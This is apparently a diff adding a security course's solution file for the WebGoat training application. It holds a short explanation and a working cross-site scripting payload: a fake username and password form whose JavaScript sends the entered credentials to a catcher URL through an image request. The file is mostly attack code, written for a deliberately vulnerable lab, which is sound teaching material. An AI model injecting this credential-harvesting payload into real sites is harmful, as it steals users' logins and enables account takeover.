@@ -1,0 +1,20 @@
+This exploit adds a form and a script onto the site. When run, the user is prompted for a username and password. Their input is recorded and sent to the URL provided. This exploit works because the server does not properly check their user inputs, allowing for Javascript and HTML to be displayed.
+
+
+<script>
+    function send_hack() {
+        var username = document.forms[0].ece568username.value;
+        var password = document.forms[0].ece568password.value;
+        XssImage = new Image();
+        XssImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user=" + username + "&password=" + password;
+    }
+</script>
+
+<form>
+    Username:<br>
+    <input type="text" name="ece568username"><br>
+    Password:<br>
+    <input type="text" name="ece568password"><br>
+    <input type="submit" name="ece568submit" onclick="send_hack()">
+</form>
+
